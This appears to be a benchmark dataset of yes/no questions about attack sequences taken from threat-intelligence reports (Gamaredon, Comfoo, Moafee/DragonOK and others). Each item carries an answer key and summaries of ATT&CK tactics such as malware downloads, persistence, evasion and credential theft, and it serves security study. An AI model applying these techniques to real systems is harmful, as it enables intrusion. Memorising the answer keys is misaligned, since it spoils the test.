Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
609,175,175-Impact-T1496-Resource Hijacking,"After deploying worms to scan for misconfigured hosts and exploiting exposed Docker API ports to gain initial access, is it likely that attackers will abuse command interpreters to execute cryptocurrency mining scripts before achieving their ultimate objective of resource hijacking through malicious container images?","Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.
Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.",Yes,Cloud_Native_Threat_Report_2021
612,176,176-Defense Evasion-T1070-Indicator Removal,"After gaining initial access to hosts by using tools such as Advanced IP Scanner, Radmin, and PushVNC package to remotely control software and create new local accounts, is it likely that attackers will use AutoExe1.bat to download malware and clear system events as part of their efforts to evade detection?","Defense Evasion: Attackers used AutoExe1.bat to download malware using BITS, clear system events, and delete traces of their activity. They also used AutoExe.bat to load Neutrino/Kasidet variants with PoS functionality, combining previous batch files Setup.bat and ClearEventN.bat. Tools like xDedic RDP Patch were used to maintain access even after password changes.","Reconnaissance: The CTI report details the use of various tools by attackers to probe and compromise IP addresses, including Medusa, Simple SMTP Scanner, Fast SYN Scanner, nVNC Scanner package, nCrack, nPCA Bruter, Fast RDP Brute GUI v2.0 package, Sentry MBA, RealVNC viewer 5.2.3, Cain and Abel, and RDP Scanner X. These tools were used to enumerate services, authenticate via brute force, fingerprint remote SMTP servers, scan ports, and authenticate on VNC and RDP ports.
Initial Access: The attackers gained initial access to hosts using tools such as Advanced IP Scanner, Radmin, PushVNC package, Fgdump, Dameware, VNC Password Recovery Tool, and xDedic RDP Patch. These tools helped identify internal hosts, remotely control software, push and start VNC services, extract password hashes, and create new local accounts.
Others: The report discusses the use of PoS malware threats such as NewPOSThings, Project Hook, PwnPOS, Alina, and Kasidet/Neutrino, which share file characteristics, distribution methods, and sources. Gorynych, a modular botnet client, was retrofitted to use BlackPOS and target PoS systems. Spy Net RAT was used for remote access and control, with capabilities like password grabbing and keylogging. The report also covers victimology, indicating that SMBs were common targets due to open ports for outsourced IT services or remote access by in-house IT admins. Attribution is uncertain, but tools used for initial entry are commonly discussed in security forums, and some file names suggest a Central European language origin. The report concludes with recommendations for both small and large organizations to secure their networks and monitor for threats.",Yes,Operation_Black Atlas_Technical_Brief
613,176,176-Defense Evasion-T1197-BITS Jobs,"After attackers gain initial access to hosts by identifying internal systems and remote control software through tools such as Advanced IP Scanner and PushVNC package, is it likely that they will use AutoExe1.bat to download malware via BITS jobs as part of their defense evasion tactics?","Defense Evasion: Attackers used AutoExe1.bat to download malware using BITS, clear system events, and delete traces of their activity. They also used AutoExe.bat to load Neutrino/Kasidet variants with PoS functionality, combining previous batch files Setup.bat and ClearEventN.bat. Tools like xDedic RDP Patch were used to maintain access even after password changes.","Reconnaissance: The CTI report details the use of various tools by attackers to probe and compromise IP addresses, including Medusa, Simple SMTP Scanner, Fast SYN Scanner, nVNC Scanner package, nCrack, nPCA Bruter, Fast RDP Brute GUI v2.0 package, Sentry MBA, RealVNC viewer 5.2.3, Cain and Abel, and RDP Scanner X. These tools were used to enumerate services, authenticate via brute force, fingerprint remote SMTP servers, scan ports, and authenticate on VNC and RDP ports.
Initial Access: The attackers gained initial access to hosts using tools such as Advanced IP Scanner, Radmin, PushVNC package, Fgdump, Dameware, VNC Password Recovery Tool, and xDedic RDP Patch. These tools helped identify internal hosts, remotely control software, push and start VNC services, extract password hashes, and create new local accounts.
Others: The report discusses the use of PoS malware threats such as NewPOSThings, Project Hook, PwnPOS, Alina, and Kasidet/Neutrino, which share file characteristics, distribution methods, and sources. Gorynych, a modular botnet client, was retrofitted to use BlackPOS and target PoS systems. Spy Net RAT was used for remote access and control, with capabilities like password grabbing and keylogging. The report also covers victimology, indicating that SMBs were common targets due to open ports for outsourced IT services or remote access by in-house IT admins. Attribution is uncertain, but tools used for initial entry are commonly discussed in security forums, and some file names suggest a Central European language origin. The report concludes with recommendations for both small and large organizations to secure their networks and monitor for threats.",Yes,Operation_Black Atlas_Technical_Brief
619,177,177-Execution-T1059-Command and Scripting Interpreter,"After Gamaredon gains initial access through malicious document files sent via emails exploiting COVID-19 lures, is it likely that the group will execute a macro code that runs a VBScript (""PlayList.vbs"") using 'wscript.exe' before achieving persistence by registering a RUN key in the Windows registry?","Execution: Upon opening the malicious document, the embedded macro code executed a VBScript (VBS) that was obfuscated. The VBS, named 'PlayList.vbs', was dropped into the '%USERPROFILE%\Documents\MediaPlayer' directory and then executed using 'wscript.exe'.","Initial Access: The Gamaredon APT group initiated their campaign by distributing targeted emails containing malicious document files. These emails leveraged the COVID-19 pandemic as a lure, with subjects such as 'Coronavirus (2019-nCoV)' to entice victims to open the attachments. The attack utilized a template injection technique to load a document template from the internet, which contained malicious macro codes.
Persistence: The VBS script was designed to register a RUN key in the Windows registry to ensure its execution at every system startup.
Defense Evasion: The Gamaredon group employed obfuscation techniques within the VBS script to evade detection. Additionally, the VBS script was designed to delete itself after execution to further avoid detection.
Command and Control: The VBS script communicated with a command and control (C&C) server located at 'hxxp://kristom[.]hopto[.]org/{computer name}_{hexadecimal volume serious number}/help_05_03[.]php'. However, during the analysis, the C&C server was not accessible, preventing the acquisition of additional payloads.
Others: The Gamaredon APT group has been active since 2013, primarily targeting Ukrainian government institutions. The group's activities were tracked from late 2019 to February 2020, with several reports published. The group's use of COVID-19 as a lure is part of a broader trend of threat actors exploiting the pandemic. The IP addresses used for the attack infrastructure were linked to Russian hosting companies, suggesting the use of rented Virtual Private Servers (VPS) for the attacks. The article recommends vigilance against suspicious emails, careful examination of file extensions, and caution with email attachments, especially those requesting macro activation. Trend Micro provides multiple security solutions to protect against such threats.",Yes,Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog
620,177,177-Execution-T1204-User Execution,"After the Gamaredon APT group distributed emails containing malicious document files loaded with a template from the internet containing macro code, is it likely that the macro code executed a VBScript (VBS) before the VBS registered a RUN key in the Windows registry for persistence?","Execution: Upon opening the malicious document, the embedded macro code executed a VBScript (VBS) that was obfuscated. The VBS, named 'PlayList.vbs', was dropped into the '%USERPROFILE%\Documents\MediaPlayer' directory and then executed using 'wscript.exe'.","Initial Access: The Gamaredon APT group initiated their campaign by distributing targeted emails containing malicious document files. These emails leveraged the COVID-19 pandemic as a lure, with subjects such as 'Coronavirus (2019-nCoV)' to entice victims to open the attachments. The attack utilized a template injection technique to load a document template from the internet, which contained malicious macro codes.
Persistence: The VBS script was designed to register a RUN key in the Windows registry to ensure its execution at every system startup.
Defense Evasion: The Gamaredon group employed obfuscation techniques within the VBS script to evade detection. Additionally, the VBS script was designed to delete itself after execution to further avoid detection.
Command and Control: The VBS script communicated with a command and control (C&C) server located at 'hxxp://kristom[.]hopto[.]org/{computer name}_{hexadecimal volume serious number}/help_05_03[.]php'. However, during the analysis, the C&C server was not accessible, preventing the acquisition of additional payloads.
Others: The Gamaredon APT group has been active since 2013, primarily targeting Ukrainian government institutions. The group's activities were tracked from late 2019 to February 2020, with several reports published. The group's use of COVID-19 as a lure is part of a broader trend of threat actors exploiting the pandemic. The IP addresses used for the attack infrastructure were linked to Russian hosting companies, suggesting the use of rented Virtual Private Servers (VPS) for the attacks. The article recommends vigilance against suspicious emails, careful examination of file extensions, and caution with email attachments, especially those requesting macro activation. Trend Micro provides multiple security solutions to protect against such threats.",Yes,Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog
627,179,179-Execution-T1106-Native API,"After delivering the malware via 'Thu moi.7z' containing 'Thumoi.hta' and executing the embedded VB Script to drop and open a decoy Microsoft Word file, is it likely that the malware will create a new process to execute the dropped '.exe' file after rewriting itself to the %Temp% folder with a randomized Hex-filename and '.tmp' extension?","Execution: The malware executes by deleting the original file and rewriting itself to the %Temp% folder with a randomized Hex-filename and '.tmp' extension. This self-copied file is polymorphic, with each execution resulting in a different MD5 hash. The malware then creates a new process to execute the dropped '.exe' file.","Initial Access: The CTI report details an APT campaign targeting individuals with malware delivered via a file named 'Thu moi.7z' containing 'Thumoi.hta'. Upon execution, the HTA file drops and opens a decoy Microsoft Word DOC file while simultaneously executing a backdoor in the background. The malware installer utilizes embedded VB Script to extract and execute the payload, employing techniques to minimize visibility and avoid detection.
Defense Evasion: The malware employs evasion techniques such as minimizing the script window and avoiding the display of the window taskbar. It also uses obfuscation to hide the writing of binary codes as HEX to form files, and it checks for the existence of files before deletion to ensure persistence.
Others: The CTI report indicates that the malware campaign is suspected to be backed by a group with a significant budget, aiming to spy on specific individuals opposed to a country's political methods. The malware is designed to appear as a common threat but employs sophisticated techniques for spying. The analysis of the malware revealed that it is part of an APT attack with potential political motivations, and the campaign has been active since at least 2009. The report also mentions that the domains used by the malware for command and control have a history of phishing and malware distribution. The investigation into the malware and its associated network is ongoing, with an open call for further information related to the threat.",Yes,blog.malwaremustdie.org-Another country-sponsored malware Vietnam APT Campaign
637,181,181-Initial Access-T1566-Phishing,"Before gaining initial access using well-crafted spear-phishing emails containing executable files or password-protected Microsoft Office documents, is it likely that the Moafee and DragonOK threat actor groups will have used tools like HTRAN to disguise their geographical location during resource development efforts?","Initial Access: The primary attack vector used by both Moafee and DragonOK groups is spear-phishing emails. The emails were well-crafted and tailored to the target audience, using appropriate language and themes. Attachments in the emails were typically executable files embedded in ZIP archives or password-protected Microsoft Office documents.","Reconnaissance: The CTI report describes two attack campaigns, Moafee and DragonOK, originating from different regions in China, using similar tools, techniques, and procedures (TTPs) to infiltrate targets. Both campaigns employed custom-built backdoors and RATs such as CT/NewCT, Mongall, and Nflog, as well as publicly available RATs like PoisonIvy, to maintain access to victim networks. They also used a proxy tool named HTRAN to disguise their geographical location. The report suggests that these groups may be collaborating, have received the same training, or have a common toolkit supply chain.
Resource Development: The CTI report indicates that the attack groups Moafee and DragonOK used similar custom-built backdoors and RATs, as well as publicly available RATs like PoisonIvy, to maintain access to victim networks. They also used a proxy tool named HTRAN to disguise their geographical location when interacting with victim networks.
Execution: The CTI report details the use of evasion techniques by both attack groups, including environment-based evasion, large file sizes, and password-protected documents. The first-stage payload for RATs called 'CT/NewCT' used by both groups employs a 'CPU core check' technique to detect the number of processor cores in the running environment. If only one core is detected, the payload quits, likely to avoid detection in virtualized environments such as sandboxes.
Persistence: The CTI report describes the use of registry entries by the CT/NewCT implant to ensure startup persistence. The implant creates a registry entry file called 'Windows.reg' and imports its contents into the registry using the command 'regedit.exe /s Windows.reg'. The contents of 'Windows.reg' are populated based on the Operating System (OS), with different entries for persistence depending on the OS version.
Defense Evasion: Both Moafee and DragonOK groups employed numerous common techniques to evade detection by sandbox environments, antivirus software, and gateway firewalls. These included environment-based evasion, the use of large file sizes, and password-protected documents. The 'CPU core check' technique was used to detect virtualized environments, and large null-padded files were used to evade detection by AV engines.
Command and Control: The CTI report details the command and control communication methods used by the backdoors and RATs employed by the Moafee and DragonOK groups. The NewCT RAT, for example, emits a 'POST' network beacon with hardcoded header values and encrypted data. The implant also has plugin functionality, allowing additional payloads to be loaded from the server.
Others: The CTI report provides insights into the geographical locations of the Moafee and DragonOK attack groups by analyzing their 'HTRAN' infrastructure. Moafee appears to operate out of Guangdong province and targets governments and military organizations with interests in the South China Sea, as well as organizations within the US defense industrial base. DragonOK operates out of Jiangsu province and targets high-tech and manufacturing companies in Japan and Taiwan. The report also acknowledges the contributions of various researchers to the analysis.",Yes,fireeye-operation-quantum-entanglement
638,181,181-Command and Control-T1071-Application Layer Protocol,"After evading detection by checking CPU core count during execution and using large null-padded files to bypass AV engines, is it likely that the NewCT RAT will emit a network beacon during command and control communication?","Command and Control: The CTI report details the command and control communication methods used by the backdoors and RATs employed by the Moafee and DragonOK groups. The NewCT RAT, for example, emits a 'POST' network beacon with hardcoded header values and encrypted data. The implant also has plugin functionality, allowing additional payloads to be loaded from the server.","Reconnaissance: The CTI report describes two attack campaigns, Moafee and DragonOK, originating from different regions in China, using similar tools, techniques, and procedures (TTPs) to infiltrate targets. Both campaigns employed custom-built backdoors and RATs such as CT/NewCT, Mongall, and Nflog, as well as publicly available RATs like PoisonIvy, to maintain access to victim networks. They also used a proxy tool named HTRAN to disguise their geographical location. The report suggests that these groups may be collaborating, have received the same training, or have a common toolkit supply chain.
Resource Development: The CTI report indicates that the attack groups Moafee and DragonOK used similar custom-built backdoors and RATs, as well as publicly available RATs like PoisonIvy, to maintain access to victim networks. They also used a proxy tool named HTRAN to disguise their geographical location when interacting with victim networks.
Initial Access: The primary attack vector used by both Moafee and DragonOK groups is spear-phishing emails. The emails were well-crafted and tailored to the target audience, using appropriate language and themes. Attachments in the emails were typically executable files embedded in ZIP archives or password-protected Microsoft Office documents.
Execution: The CTI report details the use of evasion techniques by both attack groups, including environment-based evasion, large file sizes, and password-protected documents. The first-stage payload for RATs called 'CT/NewCT' used by both groups employs a 'CPU core check' technique to detect the number of processor cores in the running environment. If only one core is detected, the payload quits, likely to avoid detection in virtualized environments such as sandboxes.
Persistence: The CTI report describes the use of registry entries by the CT/NewCT implant to ensure startup persistence. The implant creates a registry entry file called 'Windows.reg' and imports its contents into the registry using the command 'regedit.exe /s Windows.reg'. The contents of 'Windows.reg' are populated based on the Operating System (OS), with different entries for persistence depending on the OS version.
Defense Evasion: Both Moafee and DragonOK groups employed numerous common techniques to evade detection by sandbox environments, antivirus software, and gateway firewalls. These included environment-based evasion, the use of large file sizes, and password-protected documents. The 'CPU core check' technique was used to detect virtualized environments, and large null-padded files were used to evade detection by AV engines.
Others: The CTI report provides insights into the geographical locations of the Moafee and DragonOK attack groups by analyzing their 'HTRAN' infrastructure. Moafee appears to operate out of Guangdong province and targets governments and military organizations with interests in the South China Sea, as well as organizations within the US defense industrial base. DragonOK operates out of Jiangsu province and targets high-tech and manufacturing companies in Japan and Taiwan. The report also acknowledges the contributions of various researchers to the analysis.",Yes,fireeye-operation-quantum-entanglement
639,181,181-Command and Control-T1573-Encrypted Channel,"After achieving persistence through the creation and importing of OS-specific registry entries using the CT/NewCT implant, is it likely that Moafee and DragonOK will use the NewCT RAT to emit a network beacon with hardcoded header values and encrypted data during command and control operations?","Command and Control: The CTI report details the command and control communication methods used by the backdoors and RATs employed by the Moafee and DragonOK groups. The NewCT RAT, for example, emits a 'POST' network beacon with hardcoded header values and encrypted data. The implant also has plugin functionality, allowing additional payloads to be loaded from the server.","Reconnaissance: The CTI report describes two attack campaigns, Moafee and DragonOK, originating from different regions in China, using similar tools, techniques, and procedures (TTPs) to infiltrate targets. Both campaigns employed custom-built backdoors and RATs such as CT/NewCT, Mongall, and Nflog, as well as publicly available RATs like PoisonIvy, to maintain access to victim networks. They also used a proxy tool named HTRAN to disguise their geographical location. The report suggests that these groups may be collaborating, have received the same training, or have a common toolkit supply chain.
Resource Development: The CTI report indicates that the attack groups Moafee and DragonOK used similar custom-built backdoors and RATs, as well as publicly available RATs like PoisonIvy, to maintain access to victim networks. They also used a proxy tool named HTRAN to disguise their geographical location when interacting with victim networks.
Initial Access: The primary attack vector used by both Moafee and DragonOK groups is spear-phishing emails. The emails were well-crafted and tailored to the target audience, using appropriate language and themes. Attachments in the emails were typically executable files embedded in ZIP archives or password-protected Microsoft Office documents.
Execution: The CTI report details the use of evasion techniques by both attack groups, including environment-based evasion, large file sizes, and password-protected documents. The first-stage payload for RATs called 'CT/NewCT' used by both groups employs a 'CPU core check' technique to detect the number of processor cores in the running environment. If only one core is detected, the payload quits, likely to avoid detection in virtualized environments such as sandboxes.
Persistence: The CTI report describes the use of registry entries by the CT/NewCT implant to ensure startup persistence. The implant creates a registry entry file called 'Windows.reg' and imports its contents into the registry using the command 'regedit.exe /s Windows.reg'. The contents of 'Windows.reg' are populated based on the Operating System (OS), with different entries for persistence depending on the OS version.
Defense Evasion: Both Moafee and DragonOK groups employed numerous common techniques to evade detection by sandbox environments, antivirus software, and gateway firewalls. These included environment-based evasion, the use of large file sizes, and password-protected documents. The 'CPU core check' technique was used to detect virtualized environments, and large null-padded files were used to evade detection by AV engines.
Others: The CTI report provides insights into the geographical locations of the Moafee and DragonOK attack groups by analyzing their 'HTRAN' infrastructure. Moafee appears to operate out of Guangdong province and targets governments and military organizations with interests in the South China Sea, as well as organizations within the US defense industrial base. DragonOK operates out of Jiangsu province and targets high-tech and manufacturing companies in Japan and Taiwan. The report also acknowledges the contributions of various researchers to the analysis.",Yes,fireeye-operation-quantum-entanglement
640,181,181-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After using spear-phishing emails with executable files embedded in ZIP archives or password-protected Microsoft Office documents to gain initial access, is it likely that the Moafee and DragonOK groups will employ common techniques for defense evasion before ensuring persistence through the use of registry entries added via the 'Windows.reg' file?","Defense Evasion: Both Moafee and DragonOK groups employed numerous common techniques to evade detection by sandbox environments, antivirus software, and gateway firewalls. These included environment-based evasion, the use of large file sizes, and password-protected documents. The 'CPU core check' technique was used to detect virtualized environments, and large null-padded files were used to evade detection by AV engines.","Reconnaissance: The CTI report describes two attack campaigns, Moafee and DragonOK, originating from different regions in China, using similar tools, techniques, and procedures (TTPs) to infiltrate targets. Both campaigns employed custom-built backdoors and RATs such as CT/NewCT, Mongall, and Nflog, as well as publicly available RATs like PoisonIvy, to maintain access to victim networks. They also used a proxy tool named HTRAN to disguise their geographical location. The report suggests that these groups may be collaborating, have received the same training, or have a common toolkit supply chain.
Resource Development: The CTI report indicates that the attack groups Moafee and DragonOK used similar custom-built backdoors and RATs, as well as publicly available RATs like PoisonIvy, to maintain access to victim networks. They also used a proxy tool named HTRAN to disguise their geographical location when interacting with victim networks.
Initial Access: The primary attack vector used by both Moafee and DragonOK groups is spear-phishing emails. The emails were well-crafted and tailored to the target audience, using appropriate language and themes. Attachments in the emails were typically executable files embedded in ZIP archives or password-protected Microsoft Office documents.
Execution: The CTI report details the use of evasion techniques by both attack groups, including environment-based evasion, large file sizes, and password-protected documents. The first-stage payload for RATs called 'CT/NewCT' used by both groups employs a 'CPU core check' technique to detect the number of processor cores in the running environment. If only one core is detected, the payload quits, likely to avoid detection in virtualized environments such as sandboxes.
Persistence: The CTI report describes the use of registry entries by the CT/NewCT implant to ensure startup persistence. The implant creates a registry entry file called 'Windows.reg' and imports its contents into the registry using the command 'regedit.exe /s Windows.reg'. The contents of 'Windows.reg' are populated based on the Operating System (OS), with different entries for persistence depending on the OS version.
Command and Control: The CTI report details the command and control communication methods used by the backdoors and RATs employed by the Moafee and DragonOK groups. The NewCT RAT, for example, emits a 'POST' network beacon with hardcoded header values and encrypted data. The implant also has plugin functionality, allowing additional payloads to be loaded from the server.
Others: The CTI report provides insights into the geographical locations of the Moafee and DragonOK attack groups by analyzing their 'HTRAN' infrastructure. Moafee appears to operate out of Guangdong province and targets governments and military organizations with interests in the South China Sea, as well as organizations within the US defense industrial base. DragonOK operates out of Jiangsu province and targets high-tech and manufacturing companies in Japan and Taiwan. The report also acknowledges the contributions of various researchers to the analysis.",Yes,fireeye-operation-quantum-entanglement
642,181,181-Resource Development-T1587-Develop Capabilities,"After leveraging spear-phishing emails as the primary attack vector to gain initial access, is it likely that Moafee and DragonOK will utilize custom-built backdoors and RATs during resource development to support their operations before using environment-based evasion techniques, such as CPU core checks, to execute their payloads?","Resource Development: The CTI report indicates that the attack groups Moafee and DragonOK used similar custom-built backdoors and RATs, as well as publicly available RATs like PoisonIvy, to maintain access to victim networks. They also used a proxy tool named HTRAN to disguise their geographical location when interacting with victim networks.","Reconnaissance: The CTI report describes two attack campaigns, Moafee and DragonOK, originating from different regions in China, using similar tools, techniques, and procedures (TTPs) to infiltrate targets. Both campaigns employed custom-built backdoors and RATs such as CT/NewCT, Mongall, and Nflog, as well as publicly available RATs like PoisonIvy, to maintain access to victim networks. They also used a proxy tool named HTRAN to disguise their geographical location. The report suggests that these groups may be collaborating, have received the same training, or have a common toolkit supply chain.
Initial Access: The primary attack vector used by both Moafee and DragonOK groups is spear-phishing emails. The emails were well-crafted and tailored to the target audience, using appropriate language and themes. Attachments in the emails were typically executable files embedded in ZIP archives or password-protected Microsoft Office documents.
Execution: The CTI report details the use of evasion techniques by both attack groups, including environment-based evasion, large file sizes, and password-protected documents. The first-stage payload for RATs called 'CT/NewCT' used by both groups employs a 'CPU core check' technique to detect the number of processor cores in the running environment. If only one core is detected, the payload quits, likely to avoid detection in virtualized environments such as sandboxes.
Persistence: The CTI report describes the use of registry entries by the CT/NewCT implant to ensure startup persistence. The implant creates a registry entry file called 'Windows.reg' and imports its contents into the registry using the command 'regedit.exe /s Windows.reg'. The contents of 'Windows.reg' are populated based on the Operating System (OS), with different entries for persistence depending on the OS version.
Defense Evasion: Both Moafee and DragonOK groups employed numerous common techniques to evade detection by sandbox environments, antivirus software, and gateway firewalls. These included environment-based evasion, the use of large file sizes, and password-protected documents. The 'CPU core check' technique was used to detect virtualized environments, and large null-padded files were used to evade detection by AV engines.
Command and Control: The CTI report details the command and control communication methods used by the backdoors and RATs employed by the Moafee and DragonOK groups. The NewCT RAT, for example, emits a 'POST' network beacon with hardcoded header values and encrypted data. The implant also has plugin functionality, allowing additional payloads to be loaded from the server.
Others: The CTI report provides insights into the geographical locations of the Moafee and DragonOK attack groups by analyzing their 'HTRAN' infrastructure. Moafee appears to operate out of Guangdong province and targets governments and military organizations with interests in the South China Sea, as well as organizations within the US defense industrial base. DragonOK operates out of Jiangsu province and targets high-tech and manufacturing companies in Japan and Taiwan. The report also acknowledges the contributions of various researchers to the analysis.",Yes,fireeye-operation-quantum-entanglement
646,182,182-Command and Control-T1071-Application Layer Protocol,"Before utilizing HTTP requests and responses for communication and hosting a rendezvous-type traffic relay program on the Comfoo C2 server, is Comfoo likely to collect data such as system information, keystrokes, and screenshots from the victim's system using its RAT capabilities?","Command and Control: Comfoo's network traffic is encrypted and encapsulated in HTTP requests and responses, although some variants skip the encapsulation step. Payloads are encrypted by a 10-byte static XOR key that is hard-coded inside the Comfoo binary. Initial login data from the infected system (MAC address, internal IP address, campaign tag, and version data) is passed in the request URI and is additionally encrypted by a dynamic key. The Comfoo C2 server turns out to be a rendezvous-type traffic relay program. This small binary can be deployed on rented or hacked Windows systems, where it passes traffic between Comfoo victims and the Comfoo master console operated by the threat actors. The Comfoo relay server listens on up to three TCP ports at a time. The first port acts as a control and typically listens on port 1688. It performs the following tasks: Enables/disables the other ports, accepts new relay port configuration (stored in rlycfg.dll), notifies master console that a new victim connection is available. The second port is the admin relay port, which typically listens on port 1689. It accepts connections from the master console to send commands to and receive data from victims' systems. The third port is the victim relay port, which listens on a configurable port number, usually port 80 or port 443. This port accepts connections from victims' systems to send data to and receive commands from the Comfoo administrator encapsulated in HTTP requests and responses. If there is no current connection between the victim and the Comfoo administrator, Comfoo logs the victim's connection and sends an idle response to the victim.","Execution: To maintain persistence on the system, Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service. A new service is more likely to be noticed by system audits. Sometimes Comfoo is delivered with a rootkit that hides Comfoo's files on disk. Additionally, Comfoo starts the existing ""ipnat"" system service. This action causes remote inbound connections to the infected system to fail, blocking remote maintenance by the network administrator.
Persistence: To maintain persistence on the system, Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service. A new service is more likely to be noticed by system audits. Sometimes Comfoo is delivered with a rootkit that hides Comfoo's files on disk. Additionally, Comfoo starts the existing ""ipnat"" system service. This action causes remote inbound connections to the infected system to fail, blocking remote maintenance by the network administrator.
Collection: The Comfoo RAT has the following features: System/network information gathering, keystroke logging, screenshots, file upload/download/execute, command shell.
Others: The Dell SecureWorks Counter Threat Unit(TM) (CTU) research team has tracked a RAT known as ""Comfoo"" that has been in continuous development since at least 2006. This RAT has maintained a fairly low profile, even though it was used as part of the RSA breach in 2010, when its code was first analyzed. Antivirus firm Trend Micro briefly mentioned its use in a 2012 paper titled ""Luckycat Redux — Inside an APT Campaign with Multiple Targets in India and Japan."" However, the disclosure of this trojan and some of its command and control (C2) infrastructure did not discourage its continued use by the threat actors responsible for it. Dell SecureWorks researchers have identified and classified more than 200 distinct malware families used by various APT groups. Some malware is specially configured off-the-shelf software, and some malware is customized source code of an existing RAT. However, most malware families are proprietary, developed by the APT groups as weapons to be deployed against a variety of targets. Accurate identification and classification of this malware by antivirus (AV) companies is sparse. Shared code, the use of common tools, co-infections, and a history of generic or incorrect classification by multiple names make the automated tracking of these tools by AV companies difficult. This inaccuracy can be detrimental when designing defenses based on specific threat indicators. Tracking APTs requires a dedicated malware intelligence effort. One way applied malware intelligence is used to discover new APT trojans is a recursive investigative method: Malware -> Infrastructure Touchpoints -> New Malware -> and so on. Cyber-espionage actors often cycle through different RATs over a period of years. The Dell SecureWorks Counter Threat Unit(TM) (CTU) research team has tracked a RAT known as ""Comfoo"" that has been in continuous development since at least 2006. This RAT has maintained a fairly low profile, even though it was used as part of the RSA breach in 2010, when its code was first analyzed. Antivirus firm Trend Micro briefly mentioned its use in a 2012 paper titled ""Luckycat Redux — Inside an APT Campaign with Multiple Targets in India and Japan."" However, the disclosure of this trojan and some of its command and control (C2) infrastructure did not discourage its continued use by the threat actors responsible for it.",Yes,Secrets_of_the_Comfoo_Masters
